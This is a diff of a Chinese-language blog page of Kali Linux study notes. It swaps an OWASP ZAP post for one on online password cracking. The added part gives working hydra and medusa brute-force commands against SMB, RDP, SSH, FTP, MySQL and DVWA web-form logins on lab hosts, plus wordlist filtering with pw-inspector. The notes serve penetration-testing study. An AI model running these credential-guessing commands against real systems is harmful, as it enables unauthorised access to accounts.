@@ -79,15 +79,15 @@
 
 
 
-<meta name="description" content="1. OWASP_ZAP Zed attack proxy WEB Application集成渗透测试和漏洞挖掘工具 开源免费跨平台简单易用 截断代理（自动配置端口） 主动（Quick Start&#x2F;站点目录 → 攻击 → Active Scan） 被动扫描（手动爬网，截断代理） Fuzzy（工具 → Fuzz&#x2F;Request → 选择 → 右键 → Fuzz）▲ 注意File Fuzzers 暴">
+<meta name="description" content="1. hydra（稳定性可能较差） 在线密码破解–对在线服务的密码破解 离线密码破解–非在线服务的密码破解 Hydra 九头蛇，砍去一个头即长出新头，后为大力神赫拉克勒斯所杀 -vV（查看详细信息） -t（并发连接数） -e nsr（’n’ → 空字符，’s’ → 账号和密码相同，’r’ → ‘调换账号和密码’） -s（非默认输入端口） -L（自定义密码文件） -P（系统密码文件）   Wind">
 <meta name="keywords" content="安全">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Kali Linux笔记(四十二)：OWASP_ZAP">
-<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;12&#x2F;29&#x2F;Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%9B%9B%E5%8D%81%E4%BA%8C)%EF%BC%9AOWASP_ZAP&#x2F;index.html">
+<meta property="og:title" content="Kali Linux笔记(六十)：在线密码破解">
+<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;01&#x2F;25&#x2F;Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AD%E5%8D%81)%EF%BC%9A%E5%9C%A8%E7%BA%BF%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3&#x2F;index.html">
 <meta property="og:site_name" content="Tomas&#39;Blog">
-<meta property="og:description" content="1. OWASP_ZAP Zed attack proxy WEB Application集成渗透测试和漏洞挖掘工具 开源免费跨平台简单易用 截断代理（自动配置端口） 主动（Quick Start&#x2F;站点目录 → 攻击 → Active Scan） 被动扫描（手动爬网，截断代理） Fuzzy（工具 → Fuzz&#x2F;Request → 选择 → 右键 → Fuzz）▲ 注意File Fuzzers 暴">
+<meta property="og:description" content="1. hydra（稳定性可能较差） 在线密码破解–对在线服务的密码破解 离线密码破解–非在线服务的密码破解 Hydra 九头蛇，砍去一个头即长出新头，后为大力神赫拉克勒斯所杀 -vV（查看详细信息） -t（并发连接数） -e nsr（’n’ → 空字符，’s’ → 账号和密码相同，’r’ → ‘调换账号和密码’） -s（非默认输入端口） -L（自定义密码文件） -P（系统密码文件）   Wind">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2020-01-05T02:57:09.858Z">
+<meta property="og:updated_time" content="2020-01-25T15:13:08.088Z">
 <meta name="twitter:card" content="summary">
 
 
@@ -118,13 +118,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2019/12/29/Kali Linux笔记(四十二)：OWASP_ZAP/"/>
+  <link rel="canonical" href="http://yoursite.com/2020/01/25/Kali Linux笔记(六十)：在线密码破解/"/>
 
 
 
 
 
-  <title>Kali Linux笔记(四十二)：OWASP_ZAP | Tomas'Blog</title>
+  <title>Kali Linux笔记(六十)：在线密码破解 | Tomas'Blog</title>
   
 
 
@@ -243,7 +243,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/29/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%9B%9B%E5%8D%81%E4%BA%8C)%EF%BC%9AOWASP_ZAP/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/25/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AD%E5%8D%81)%EF%BC%9A%E5%9C%A8%E7%BA%BF%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Tomas">
@@ -260,7 +260,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">Kali Linux笔记(四十二)：OWASP_ZAP</h1>
+          <h1 class="post-title" itemprop="name headline">Kali Linux笔记(六十)：在线密码破解</h1>
         
 
         <div class="post-meta">
@@ -272,8 +272,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-12-29T10:51:56+08:00">
-                2019-12-29
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-25T23:13:23+08:00">
+                2020-01-25
               </time>
             
 
@@ -333,116 +333,124 @@
 
       
         <hr>
-<h4 id="1-OWASP-ZAP"><a href="#1-OWASP-ZAP" class="headerlink" title="1. OWASP_ZAP"></a>1. OWASP_ZAP</h4><ul>
-<li>Zed attack proxy</li>
-<li>WEB Application集成渗透测试和漏洞挖掘工具</li>
-<li>开源免费跨平台简单易用</li>
-<li>截断代理（自动配置端口）</li>
-<li>主动（Quick Start/站点目录 → 攻击 → Active Scan）</li>
-<li>被动扫描（手动爬网，截断代理）</li>
-<li>Fuzzy（工具 → Fuzz/Request → 选择 → 右键 → Fuzz）▲ 注意File Fuzzers</li>
-<li>暴力破解（站点目录 → Request → 选择 → 右键 → Fuzz → Payload(字典文件)）</li>
-<li>API（必须使用了OWASP_ZAP代理的情况下）<ul>
-<li><a href="http://zap/" target="_blank" rel="noopener">http://zap/</a></li>
+<h4 id="1-hydra（稳定性可能较差）"><a href="#1-hydra（稳定性可能较差）" class="headerlink" title="1. hydra（稳定性可能较差）"></a>1. hydra（稳定性可能较差）</h4><ul>
+<li>在线密码破解–对在线服务的密码破解</li>
+<li>离线密码破解–非在线服务的密码破解</li>
+<li>Hydra<ul>
+<li>九头蛇，砍去一个头即长出新头，后为大力神赫拉克勒斯所杀</li>
+<li>-vV（查看详细信息）</li>
+<li>-t（并发连接数）</li>
+<li>-e nsr（’n’ → 空字符，’s’ → 账号和密码相同，’r’ → ‘调换账号和密码’）</li>
+<li>-s（非默认输入端口）</li>
+<li>-L（自定义密码文件）</li>
+<li>-P（系统密码文件）</li>
+</ul>
+</li>
+<li>Windows密码破解 ▲ 2020.1.25 window2003使用到期，需要密钥<ul>
+<li>window2003设置密码，开启远程桌面（net share查看共享文件）</li>
+<li><strong><code>🔺命令：hydra -l administartor -P pass.lst smb://1.1.1.1 -vV</code></strong></li>
+<li><strong><code>🔺命令：hydra -l administartor -P pass.lst rdp://1.1.1.1 -t 1 -vV</code></strong></li>
+</ul>
+</li>
+<li>Linux密码破解<ul>
+<li>设置Metasploitable的root登陆密码（sudo passwd root）</li>
+<li><strong><code>🔺命令：hydra -l root -P pass.lst ssh://1.1.1.1 -vV</code></strong></li>
+<li>▲ 日志服务器的报警</li>
+</ul>
+</li>
+<li>其他服务密码破解<ul>
+<li>kali：<strong><code>🔺命令：nmap -p2121 IP地址</code></strong>（是否开启）</li>
+<li>kali：<strong><code>🔺命令：nmap -p2121 IP地址 -sV</code></strong>（开启的服务）</li>
+<li><strong><code>🔺命令：hydra -L user.lst -P pass.lst ftp://1.1.1.1 -s 2121 -e nsr -o p.txt -t 64</code></strong></li>
+</ul>
+</li>
+<li>图形化界面<ul>
+<li><strong><code>🔺命令：xhydra</code></strong>（旧版本为hydra-gtk）</li>
+<li><strong><code>🔺命令：ftp 1.1.1.1</code></strong>（Metasploitable的21端口ftp服务配置错误，只要用户名正确，无密码）</li>
+</ul>
+</li>
+<li>HTTP表单身份认证<ul>
+<li><strong><code>🔺命令：hydra -l admin -P pass.lst 1.1.1.1 http-post-form &quot;/dvwa/login.php:username=^USER^&amp;password=^PASS^&amp;Login=Login:S=index.php&quot; -V</code></strong> </li>
+<li><strong><code>🔺命令：hydra -l admin -P pass.lst 1.1.1.1 http-post-form &quot;/dvwa/login.php:username=^USER^&amp;password=^PASS^&amp;Login=Login:Login Failed&quot; -V</code></strong></li>
+<li>特征字符非Login Failed，为index.php，特征字符可以位于header中，也可以位于body</li>
+<li>/foo.php:user=^USER^&amp;pass=^PASS^:S=success:C=/page/cookie:H =X-Foo:Foo<ul>
+<li>C：先访问指定页面取得cookie </li>
+<li>H：指定http头</li>
+</ul>
+</li>
+<li>https-post-form、https-get-form、https-get-form</li>
+<li>-S:使用SSL连接</li>
 </ul>
 </li>
 </ul>
-<h4 id="2-OWASP-ZAP"><a href="#2-OWASP-ZAP" class="headerlink" title="2. OWASP_ZAP"></a>2. OWASP_ZAP</h4><ul>
-<li>Persist Session</li>
-<li>Mode<ul>
-<li>Safe（安全扫描，不包含危险扫描）</li>
-<li>Protected（指定Web Application进行危险扫描）</li>
-<li>Standard（标准扫描，存在一些危险扫描，可能造成破坏）</li>
-<li>ATTACK（能扫就扫，能有多强烈就多强烈）</li>
+<h4 id="2-pw-inspector"><a href="#2-pw-inspector" class="headerlink" title="2. pw-inspector"></a>2. pw-inspector</h4><ul>
+<li>pw-inspector<ul>
+<li>按长度和字符集筛选字典</li>
+<li><strong><code>🔺命令：pw-inspector -i /usr/share/wordlists/nmap.lst -o p.lst -l</code></strong>（小写字母筛选）</li>
+<li><strong><code>🔺命令：pw-inspector -i /usr/share/wordlists/nmap.lst -o P.lst -u</code></strong>（大写字母筛选）</li>
+<li>-m（最小位数）</li>
+<li>-M（最大位数）</li>
 </ul>
 </li>
-<li>升级Add-ones</li>
-<li>Anti CSRF Tokens（每次访问，随机生成一个Token → 防止CSRF/重放攻击）</li>
-</ul>
-<blockquote>
-<pre><code>▲ 一般情况下，虽然Tokens是变化的，但Tokens的头部是一般是固定不变的，可以添加到OWASP_ZAP中，可以做到重放攻击
-设置Options → Anti CSRF Tokens → Add（Tokens的名字）</code></pre></blockquote>
-<ul>
-<li>https–CA（增加OWASP_ZAP自签名证书）</li>
-</ul>
-<blockquote>
-<pre><code>▲ 设置Options → Dynamic SSL Certificates → 保存（cet证书） → 安装证书</code></pre></blockquote>
-<ul>
-<li>Scope/Cpntexts/Filter</li>
-<li>Http Sessions–default session tokens &amp; site session tokes</li>
-<li>Note/tag</li>
-<li>Passive Scan</li>
-</ul>
-<h4 id="3-OWASP-ZAP-Session"><a href="#3-OWASP-ZAP-Session" class="headerlink" title="3. OWASP_ZAP Session"></a>3. OWASP_ZAP Session</h4><ul>
-<li>persist the ZAP Session（文件 → 打开会话）<ul>
-<li>current timestamp（保存默认的ZAP目录）</li>
-<li>specify the name and location（长久保存自定义目录）</li>
-<li>not persist the ZAP Session（不长久保存）</li>
-</ul>
-</li>
-<li>Request/Response</li>
-<li>手动爬网 → OWASP_ZAP分析 </li>
-</ul>
-<h4 id="4-OWASP-ZAP-Manage-Add-ones"><a href="#4-OWASP-ZAP-Manage-Add-ones" class="headerlink" title="4. OWASP_ZAP Manage Add-ones"></a>4. OWASP_ZAP Manage Add-ones</h4><ul>
-<li>Installed（版本更新可能需要到Github）<ul>
-<li>Uninstall Selected</li>
-<li>Update Selected</li>
-</ul>
-</li>
-<li>Marketplace<ul>
-<li>Release（长期使用，正式发布）</li>
-<li>Beta（测试使用，较正式发布）</li>
-<li>Alpha（不是成熟的版本，稳定性准备性不是很高）</li>
+<li>密码破解效率<ul>
+<li>密码复杂度（字典命中率）</li>
+<li>带宽、协议、服务器性能、客户端性能</li>
+<li>锁定阈值</li>
+<li>单位时间最大登陆请求次数</li>
 </ul>
 </li>
 </ul>
-<h4 id="5-OWASP-ZAP-policy"><a href="#5-OWASP-ZAP-policy" class="headerlink" title="5. OWASP_ZAP policy"></a>5. OWASP_ZAP policy</h4><ul>
-<li>General<ul>
-<li>添加策略</li>
-<li>Name</li>
-<li>Default Alert Threshold（报警阈值，一般选中等）</li>
-<li>Default Attack Strength（攻击强度）</li>
+<h4 id="3-medusa"><a href="#3-medusa" class="headerlink" title="3. medusa"></a>3. medusa</h4><ul>
+<li>Hydra的缺点<ul>
+<li>稳定性差，程序时常崩溃</li>
+<li>速度控制不好，容易触发服务屏蔽或锁死机制</li>
+<li>每主机新建过程，每服务新建实例</li>
+<li>大量目标破解时性能差</li>
+<li>▲ 对CPU以及存储空间占用较大</li>
 </ul>
 </li>
-<li>信息收集</li>
-<li>客户端浏览器</li>
-<li>服务器安全</li>
-<li>杂项</li>
-<li>注入</li>
-</ul>
-<h4 id="6-OWASP-ZAP-Scope-Cpntexts-Filter（范围-上下文-筛选）"><a href="#6-OWASP-ZAP-Scope-Cpntexts-Filter（范围-上下文-筛选）" class="headerlink" title="6. OWASP_ZAP Scope/Cpntexts/Filter（范围/上下文/筛选）"></a>6. OWASP_ZAP Scope/Cpntexts/Filter（范围/上下文/筛选）</h4><ul>
-<li>站点目录 → Include in Context → New context</li>
-<li>Scope包含Context，可以删除一个Context</li>
-<li>同一个范围Scope同一个策略</li>
-</ul>
-<h4 id="7-OWASP-ZAP-Http-Session"><a href="#7-OWASP-ZAP-Http-Session" class="headerlink" title="7. OWASP_ZAP Http Session"></a>7. OWASP_ZAP Http Session</h4><ul>
-<li>工具栏 → Session Properties<ul>
-<li>针对不同Context有不同的Authentication</li>
-<li>默认Manual Authentication（记录访问过网站的Session，手动输入记录）</li>
-<li>支持表单、HTTP Basic、Sript-Base</li>
+<li>Medusa的特点<ul>
+<li>稳定性好（单主机、多主机）</li>
+<li>速度控制得当</li>
+<li>基于线程</li>
+<li>支持模块少于hydra（不支持RDP）</li>
+<li>WEB-Form支持存在缺陷（只支持失败获得的信息，且只支持200响应代码的页面）</li>
 </ul>
 </li>
-<li>站点 → 加号 → 新建脚本</li>
-<li>选项 → Http Session → 增加Web Application自定义的Session </li>
-</ul>
-<h4 id="8-OWASP-ZAP-编码解码哈希"><a href="#8-OWASP-ZAP-编码解码哈希" class="headerlink" title="8. OWASP_ZAP 编码解码哈希"></a>8. OWASP_ZAP 编码解码哈希</h4><ul>
-<li>选择编码的字段或要编码的字段 → 右键选择</li>
-</ul>
-<blockquote>
-<pre><code>SHA1 -- 彩虹表，统计哈希值对应的值</code></pre></blockquote>
-<h4 id="9-OWASP-ZAP-截断"><a href="#9-OWASP-ZAP-截断" class="headerlink" title="9. OWASP_ZAP 截断"></a>9. OWASP_ZAP 截断</h4><ul>
-<li>工具栏 → Set break on all requests and responses</li>
-<li>单步截断/一次截断</li>
-<li>▲ 显示隐藏域（小灯泡）– 代理服务器修改返回的内容后返回给浏览器</li>
-</ul>
-<h4 id="10-OWASP-ZAP"><a href="#10-OWASP-ZAP" class="headerlink" title="10. OWASP_ZAP"></a>10. OWASP_ZAP</h4><ul>
-<li>标准扫描工作流程<ul>
-<li>设置代理</li>
-<li>手动爬网</li>
-<li>自动爬网（OWASP_ZAP自动爬网，站点目录 → 右键攻击 → 爬网/Forced Browser site/Forced Browser directory/Forced Browser directory(and children)）</li>
-<li>主动扫描（OWASP_ZAP自动爬网，站点目录 → 右键攻击 → Active Scan）</li>
+<li>常用参数<ul>
+<li><strong><code>🔺命令：mdeusa -d</code></strong>（查看支持的模块）</li>
+<li><strong><code>🔺命令：medusa -M</code></strong>（选择的模块）</li>
+<li><strong><code>🔺命令：medusa -M 模块 -q</code></strong>（查看模块详细参数）</li>
+<li>-m（大模块相应的参数）    </li>
+<li>-h IP地址（选择的主机）-u 用户（指定用户）、-P 密码（指定密码文件）</li>
+<li>-e（n/s/ns）（同hydra，但缺少参数r）</li>
+<li>-F（获取一个即停止）</li>
+<li>-T 数字（并发主机数）</li>
+<li>-v 数字（显示破解过程的详细信息程度）</li>
+<li>-n 端口（使用端口）</li>
+<li>-s （使用SSL连接）</li>
 </ul>
 </li>
+<li>破解Windows密码（Window Server 2003）▲ 2020.1.25 window2003使用到期，需要密钥<ul>
+<li><strong><code>🔺命令：net user administrator zipper</code></strong></li>
+<li><strong><code>🔺命令：medusa -M smbnt -h 1.1.1.1 -u administrator -P pass.lst -e ns -F</code></strong></li>
+</ul>
+</li>
+<li>破解Linux SSH密码（Metasploit）<ul>
+<li><strong><code>🔺命令：cat /usr/share/wordlists/nmap.lst | grep -v \# &gt; pass.lst</code></strong></li>
+<li><strong><code>🔺命令：medusa -M ssh -h 192.168.20.10 -u root -P pass.lst -e ns –F</code></strong></li>
+</ul>
+</li>
+<li>其他服务密码破解<ul>
+<li><strong><code>🔺命令：medusa -M mysql -h 1.1.1.1 -u root -P pass.lst -e ns -F</code></strong></li>
+<li><strong><code>🔺命令：medusa -M ftp -h 1.1.1.1 -u ftp -P pass.lst -e ns -F</code></strong></li>
+<li><strong><code>🔺命令：medusa -h 1.1.1.1 -u admin -P pass.lst -M web-form -m FORM:&quot;dvwa/login.php&quot; -m DENY-SIGNAL:&quot;login.php&quot; -m FORMDATA:&quot;post?user=username&amp;pass=password&amp;Login=Login&quot;</code></strong> ▲ 2020.1.25实验无法破解密码</li>
+</ul>
+</li>
+</ul>
+<h4 id="4-在线密码破解"><a href="#4-在线密码破解" class="headerlink" title="4. 在线密码破解"></a>4. 在线密码破解</h4><ul>
+<li>网站的在线密码破解</li>
+<li>MD5：<a href="https://cmd5.com/" target="_blank" rel="noopener">https://cmd5.com/</a></li>
 </ul>
 
       
@@ -474,8 +482,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/12/27/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%9B%9B%E5%8D%81)%EF%BC%9AW3AF/" rel="next" title="Kali Linux笔记(四十)：W3AF">
-                <i class="fa fa-chevron-left"></i> Kali Linux笔记(四十)：W3AF
+              <a href="/2020/01/24/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81%E5%85%AD)%EF%BC%9ASSL%E3%80%81TLS%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB--%E4%BC%AA%E9%80%A0%E8%AF%81%E4%B9%A6/" rel="next" title="Kali Linux笔记(五十六)：SSL、TLS中间人攻击--伪造证书">
+                <i class="fa fa-chevron-left"></i> Kali Linux笔记(五十六)：SSL、TLS中间人攻击--伪造证书
               </a>
             
           </div>
@@ -484,8 +492,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2019/12/29/Kali%20linux%E7%AC%94%E8%AE%B0(%E5%9B%9B%E5%8D%81%E4%B8%80)%EF%BC%9AArachni/" rel="prev" title="Kali Linux笔记(四十一)：Arachni">
-                Kali Linux笔记(四十一)：Arachni <i class="fa fa-chevron-right"></i>
+              <a href="/2020/01/25/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81%E4%B9%9D)%EF%BC%9A%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3--%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E3%80%81%E5%AD%97%E5%85%B8/" rel="prev" title="Kali Linux笔记(五十九)：密码破解--身份认证、字典">
+                Kali Linux笔记(五十九)：密码破解--身份认证、字典 <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -656,7 +664,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-OWASP-ZAP"><span class="nav-number">1.</span> <span class="nav-text">1. OWASP_ZAP</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-OWASP-ZAP"><span class="nav-number">2.</span> <span class="nav-text">2. OWASP_ZAP</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-OWASP-ZAP-Session"><span class="nav-number">3.</span> <span class="nav-text">3. OWASP_ZAP Session</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-OWASP-ZAP-Manage-Add-ones"><span class="nav-number">4.</span> <span class="nav-text">4. OWASP_ZAP Manage Add-ones</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5-OWASP-ZAP-policy"><span class="nav-number">5.</span> <span class="nav-text">5. OWASP_ZAP policy</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#6-OWASP-ZAP-Scope-Cpntexts-Filter（范围-上下文-筛选）"><span class="nav-number">6.</span> <span class="nav-text">6. OWASP_ZAP Scope/Cpntexts/Filter（范围/上下文/筛选）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#7-OWASP-ZAP-Http-Session"><span class="nav-number">7.</span> <span class="nav-text">7. OWASP_ZAP Http Session</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#8-OWASP-ZAP-编码解码哈希"><span class="nav-number">8.</span> <span class="nav-text">8. OWASP_ZAP 编码解码哈希</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#9-OWASP-ZAP-截断"><span class="nav-number">9.</span> <span class="nav-text">9. OWASP_ZAP 截断</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#10-OWASP-ZAP"><span class="nav-number">10.</span> <span class="nav-text">10. OWASP_ZAP</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-hydra（稳定性可能较差）"><span class="nav-number">1.</span> <span class="nav-text">1. hydra（稳定性可能较差）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-pw-inspector"><span class="nav-number">2.</span> <span class="nav-text">2. pw-inspector</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-medusa"><span class="nav-number">3.</span> <span class="nav-text">3. medusa</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-在线密码破解"><span class="nav-number">4.</span> <span class="nav-text">4. 在线密码破解</span></a></li></ol></div>
             
 
           </div>
